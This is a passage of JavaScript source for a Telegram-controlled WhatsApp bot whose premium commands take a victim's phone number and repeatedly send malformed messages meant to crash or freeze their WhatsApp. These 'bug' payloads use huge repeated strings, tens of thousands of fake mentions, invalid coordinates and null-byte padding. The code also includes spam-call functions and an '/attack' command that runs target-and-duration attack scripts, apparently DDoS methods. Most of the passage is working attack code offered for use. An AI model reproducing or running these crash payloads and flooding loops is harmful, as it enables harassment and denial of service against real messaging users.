  } catch (err) {
    console.error("Error in saturncore command:", err);
    await skp.reply("An error occurred. Please try again later or contact the owner.");
  }
});

async function Vi3wsStath(target, show) {
    let push = [];

    push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "u sure?" }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "loser haha" }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: " ",
            hasMediaAttachment: true,
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                fileLength: "18352",
                height: 720,
                width: 1280,
                mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1737281900",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                scanLengths: [3537, 10557, 1905, 2353],
                midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
            },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ 
            messageParamsJson: "\n".repeat(10000),
            buttons: []
        }),
    });

    let msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ text: "u sure?" }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: "loser haha" }),
                        header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
                    }),
                },
            },
        },
        {}
    );

    await Sokeppp.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined,
                            },
                        ],
                    },
                ],
            },
        ],
    });

    if (show) {
        await Sokeppp.relayMessage(
            target,
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "饾悊汀饾悶蜏饾悡饾悞态汀饾惍廷饾悧釐濔潗? 鈲ａ碂 饾悁谈饾悽廷饾悽汀饾悵蜏饾悎蜐廷饾悅銆斤笍" },
                        content: undefined,
                    },
                ],
            }
        );
    }
}

async function InVisiOneMess(target, qTed, Ztc, Ptcp = false) {
                        let etc = generateWAMessageFromContent(target,
                                proto.Message.fromObject({
                                        ephemeralMessage: {
                                                message: {
                                                        interactiveMessage: {
                                                                header: {
                                                                        title: "hello, and goodbye..馃寽踏",
                                                                          "locationMessage": {
                                                                      "degreesLatitude": -999.03499999999999,
                                                                          "degreesLongitude": 922.999999999999,
                                                                          "name": "馃悏",
                                                                          "address": "饾悊汀饾悶蜏饾悡饾悞态汀饾惍廷饾悧釐濔潗? 鈲ａ碂 饾悁谈饾悽廷饾悽汀饾悵蜏饾悎蜐廷饾悅銆斤笍",
                                                                          "jpegThumbnail": Ztc
                                                                        },
                                                                        hasMediaAttachment: true
                                                                },
                                                                body: {
                                                                        text: ""
                                                                },
                                                                nativeFlowMessage: {
                                                                        messageParamsJson: "{".repeat(10000),
                                                                        buttons: [],
                                                                },
                                                        }
                                                }
                                        }
                                }), {
                                        userJid: target,
                                        quoted: qTed
                                }
                        );
                        await Sokeppp.relayMessage(target, etc.message, Ptcp ? {
                                participant: {
                                        jid: target
                                }
                        } : {});
                        console.log(chalk.green("# D3parted - Echoes In Void Sent馃幁"));
                };

bot.command("sokepinvis", checkWhatsAppConnection, checkPremium, async skp => {
  try {
    const text = skp.message.text;
    const cmd = text.split(" ")[0].slice(1);
    const q = text.split(" ")[1];

    if (!q || q.length < 9 || !/\d/.test(q)) {
      return await skp.reply(`Enter a valid number. Example: /${cmd} 628xxxxxx`);
    }

    let raw = q.replace(/\D/g, '');
    if (raw.length < 8) {
      return await skp.reply(`❌ Nomor terlalu pendek. Minimal 8 digit.`);
    }
    if (raw.startsWith("0")) {
      return await skp.reply(`❌ Format salah. Nomor tidak boleh dimulai dengan 0. Gunakan format internasional seperti 628xxxxxx`);
    }

    const target = raw + "@s.whatsapp.net";

    await prosesrespone(target, skp);

    setImmediate(async () => {
      for (let i = 0; i < 300; i++) {
        try {
          await xatanicaldelayv2(target);
          await sleep(1000);
          await xatanicaldelayv2(target);
          await sleep(1000);
        } catch (err) {
          console.log("Failed saturncore:", err);
        }
      }
    });

  } catch (err) {
    console.error("Error in saturncore command:", err);
    await skp.reply("An error occurred. Please try again later or contact the owner.");
  }
});

async function xatanicaldelayv2(target, mention) {
  console.log(chalk.blue(`Delay Hard V2 To Target ${target}`));
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Sokeppp.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

                

bot.command(["saturncore", "saturninvis","saturnstunt"], checkWhatsAppConnection, checkPremium, async skp => {
  try {
    const text = skp.message.text;
    const cmd = text.split(" ")[0].slice(1);
    const q = text.split(" ")[1];

    if (!q || q.length < 9 || !/\d/.test(q)) {
      return await skp.reply(`Enter a valid number. Example: /${cmd} 628xxxxxx`);
    }

    let raw = q.replace(/\D/g, '');
    if (raw.length < 8) {
      return await skp.reply(`❌ Nomor terlalu pendek. Minimal 8 digit.`);
    }
    if (raw.startsWith("0")) {
      return await skp.reply(`❌ Format salah. Nomor tidak boleh dimulai dengan 0. Gunakan format internasional seperti 628xxxxxx`);
    }

    const target = raw + "@s.whatsapp.net";

    await prosesrespone(target, skp);

    setImmediate(async () => {
      for (let i = 0; i < 300; i++) {
        try {
          await paymentX(target);
          await sleep(1000);
          await paymentX(target);
          await sleep(1000);
        } catch (err) {
          console.log("Failed saturncore:", err);
        }
      }
    });

  } catch (err) {
    console.error("Error in saturncore command:", err);
    await skp.reply("An error occurred. Please try again later or contact the owner.");
  }
});

async function NewAmpas2(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                paymentInviteMessage: {
                    serviceType: "UPI",
                    expiryTimestamp: Date.now() + 86400000,
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Sokeppp.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

function generateMessageID() {
  return Math.random().toString(36).substring(2, 12);
}

async function paymentX(target){
try {
const bugMessage = {
viewOnceMessage: {
message: {
requestPaymentMessage: {
currencyCodeIso4217: "XXX",
amount1000: 999999999,
noteMessage: {
extendedTextMessage: {
text: "𝗞𝗮𝗺𝘂 𝗮𝗽𝗮 𝗸𝗮𝗯𝗮𝗿 𝗷𝗶𝗿?🥹 ::: 𝗦𝗼𝗸𝗲𝗽 𝗱𝗶 𝘀𝗶𝗻𝗶 𝗹𝗼𝗵👻😡",
contextInfo: {
isForwarded: true,
forwardingScore: 9741,
forwardedNewsletterMessageInfo: {
newsletterName: "𝗞𝗮𝗺𝘂 𝗮𝗽𝗮 𝗸𝗮𝗯𝗮𝗿 𝗷𝗶𝗿?🥹 ::: 𝗦𝗼𝗸𝗲𝗽 𝗱𝗶 𝘀𝗶𝗻𝗶 𝗹𝗼𝗵👻😡",
newsletterJid: "120363417446780608@newsletter",
serverMessageId: 1
},
mentionedJid: Array.from({ length: 40000 }, () =>
"1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
),
businessMessageForwardInfo: {
businessOwnerJid: "5521992999999@s.whatsapp.net"
},
nativeFlowResponseMessage: {
name: "𝗞𝗮𝗺𝘂 𝗮𝗽𝗮 𝗸𝗮𝗯𝗮𝗿 𝗷𝗶𝗿?🥹 ::: 𝗦𝗼𝗸𝗲𝗽 𝗱𝗶 𝘀𝗶𝗻𝗶 𝗹𝗼𝗵👻😡",
paramsJson: "\u0000".repeat(999999)
}
}
}
},
expiryTimestamp: Date.now() + 86400000,
requestFrom: "5521992999999@s.whatsapp.net"
}
}
}
}

await Sokeppp.relayMessage('status@broadcast', bugMessage.viewOnceMessage.message, {
messageId: generateMessageID(),
statusJidList: [target],
additionalNodes: [{
tag: 'meta',
attrs: {},
content: [{
tag: 'mentioned_users',
attrs: {},
content: [{
tag: 'to',
attrs: { jid: target },
content: undefined
}]
}]
}]
})

} catch (err) {
console.log("Error:", err)
}
}

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

async function sendOfferCall(target) {
  try {
    await Sokeppp.offerCall(target);
      console.log(chalk.hex('#0000FF').bold(`┌──────────────────────────────────────────────────────────────────────────┐
│ Success Send Spam Call to ${target} 🤙😜
└──────────────────────────────────────────────────────────────────────────┘`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━
async function sendOfferVideoCallManual(target) {
  try {
    const callId = generateMessageID();
    const from = Sokeppp.user.id;

    await Sokeppp.query({
      tag: 'call',
      attrs: {
        from,
        to: target,
        id: callId,
        type: 'offer',
      },
      content: [
        {
          tag: 'offer',
          attrs: {
            'call-id': callId,
            'call-creator': from,
            'call-type': 'video',
            'device_class': '1'
          },
          content: []
        }
      ]
    });

    console.log(chalk.hex('#0000FF').bold(`┌──────────────────────────────────────────────────────────────────────────┐
│ Success Send Video Call to ${isTarget} 🤙😜
└──────────────────────────────────────────────────────────────────────────┘`));
  } catch (e) {
    console.error(`❌ Gagal kirim video call:`, e);
  }
}
 


//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━
bot.command(["request", "req", "saran"], async (ctx) => {
  try {
    const args = ctx.message.text?.split(" ").slice(1);
    if (!args || args.length === 0) {
      return ctx.reply("Contoh:\n/request tambahin fitur blur foto dong");
    }

    const input = args.join(" ");
    const userId = ctx.from.id;
    const nama = ctx.from.first_name || "User";
    const pengirim = `@${ctx.from.username || ctx.from.id}`;
    let ppUrl = "https://files.catbox.moe/0z07fu.jpg";

    // Ambil foto profil Telegram
    try {
      const photos = await ctx.telegram.getUserProfilePhotos(userId);
      if (photos.total_count > 0) {
        const fileId = photos.photos[0][0].file_id;
        const file = await ctx.telegram.getFileLink(fileId);
        ppUrl = file.href;
      }
    } catch (e) {
      console.warn("⚠️ Gagal ambil foto profil, pakai default.");
    }

    const encodedText = encodeURIComponent(input);
    const encodedNama = encodeURIComponent(nama);
    const encodedPP = encodeURIComponent(ppUrl);

    const imageURL = `https://flowfalcon.dpdns.org/imagecreator/ngl?title=Dari+${encodedNama}&text=${encodedText}&avatar=${encodedPP}`;
    const caption = `🛠️ *Request Fitur Baru!*\n\n"${input}"\n\n📩 Dari: ${pengirim}`;
    const captionWA = `> Dari: ${pengirim}\n> Pesan: ${input}`;

    // Kirim ke allowedDevelopers (Telegram)
    for (const devId of require("./config").allowedDevelopers) {
      await bot.telegram.sendPhoto(devId, imageURL, {
        caption,
        parse_mode: "Markdown",
      });
    }

    // Kirim ke WhatsApp Channel
    await Sokeppp.sendMessage(global.idch, {
      image: { url: imageURL },
      caption: captionWA,
      contextInfo: {
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          newsletterName: nama,
        },
        externalAdReply: {
          title: "Messages sent from telegram",
          body: `From: ${nama}`,
          thumbnailUrl: ppUrl,
          mediaType: 1,
          renderLargerThumbnail: false,
          sourceUrl: "",
        },
      },
    });

    // Kirim juga ke WhatsApp Owner
    await Sokeppp.sendMessage(global.noowner + "@s.whatsapp.net", {
      image: { url: imageURL },
      caption: captionWA,
    });

    return ctx.reply("✅ Request kamu sudah dikirim ke owner, developer, dan channel!");
  } catch (err) {
    console.error("❌ Gagal kirim request:", err);
    return ctx.reply("❌ Gagal kirim request. Coba lagi nanti ya.");
  }
});

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━
  bot.command("attack", (ctx) => {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 3) {
      return ctx.reply("Usage: /attack <method> <target> <time>");
    }

    const [method, target, time] = args;
    const methodFile = `./methods/${method}.js`;

    if (!fs.existsSync(methodFile)) {
      return ctx.reply(`❌ Method "${method}" not found.`);
    }

    exec(`node ${methodFile} ${target} ${time}`, (error, stdout, stderr) => {
      if (error) {
        console.error(error);
        return ctx.reply(`❌ Error running ${method}`);
      }
      ctx.reply(`✅ Started ${method} on ${target} for ${time}s`);
    });
  });
//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━
bot.launch();
console.log(chalk.hex('#0000FF')(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠠⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠠⡐⣐⣧⣾⣾⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣥⣤⣴⢶⣶⣶⣶⣶⠾⠞⠓⠂⠂⠓⠀⠂⠀⢀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣻⣿⣿⣿⣿⣥⠤⣥⢶⡂⠿⡽⡽⡽⡽⠟⣼⣄⣔⣤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠄⡀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣍⣿⣿⣛⣻⡿⣿⡷⣶⢍⠢⡀⠿⣤⢲⡆⢹⢾⢸⠂⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠉⠛⣿⣎⢻⠞⣣⣄⡷⢿⠿⣼⢃⣓⢎⠆⠀⠀
⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⠆⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣟⢦⣶⣿⢝⠞⡨⣳⡿⢑⣹⠟⠁⠀⠀⠀
⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⢾⡻⣙⢔⢨⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣴⣟⣵⡿⣻⣕⢥⣾⢞⣵⡣⠞⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣶⢟⡭⡺⣝⣝⣾⡾⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⡿⣞⣿⡾⡿⣝⣼⡪⣟⣽⡾⠟⠁⠀⢀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡠⣴⠟⣩⣾⠗⡩⣪⣾⡿⣻⡾⠛⣏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣻⣯⣗⣯⣷⡟⣏⣧⡷⣟⣫⡵⠞⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⡪⠞⠡⣚⡻⠥⡜⣮⣟⣾⢼⣿⡅⠀⢹⡸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢿⡞⣿⣻⢼⢷⣛⣯⡷⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣱⣍⣡⣁⡮⡷⢺⣟⢿⣷⣻⣮⣻⡿⣶⣤⣿⣿⣟⣿⣿⣿⣛⣻⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣧⣿⣷⣫⣿⢷⡟⢏⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣼⢶⣟⢼⡻⣺⣝⡷⣨⢓⠥⡟⣻⣾⣿⠿⠿⣷⣶⣶⣾⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣯⣿⣿⣿⣟⡻⠛⣓⣺⣵⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠿⣗⡽⣵⡌⣝⡛⣷⡿⢿⣤⣿⣿⣷⣾⡿⢿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡯⠛⠛⡿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠉⠙⠚⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠛⠋⠉ ⠩⢗⢽⡿⣿⣿⣿⣿  ⣿⣿⣿⣿⣿⠟⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠁⠙⠋⠟⠋⠛⠛⡛⡛⠛⠛⠉⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠁⠀⠀⠀⠀⠀⠀⠄⠂
⠀⠄⠀⠀⠀⠐⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠈⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠂⠀⠀⠂⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠁⡀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠂⠀⠀⠀⠠⠀⠀⠀⠀`));